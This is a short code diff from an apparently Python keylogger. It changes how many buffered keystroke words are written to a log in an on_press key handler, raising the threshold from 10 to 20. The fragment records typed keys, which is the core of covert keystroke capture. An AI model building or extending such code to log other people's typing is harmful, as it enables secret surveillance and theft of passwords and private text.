@@ -14,7 +14,7 @@ def on_press(key):
 	if key==Key.space or key ==Key.enter:
 		key=" "
 	
-	if word_count==10 or key==" ":
+	if word_count==20 or key==" ":
 		word_count=0
 		logging.info(word)
 		word=str(key)[1:-1]
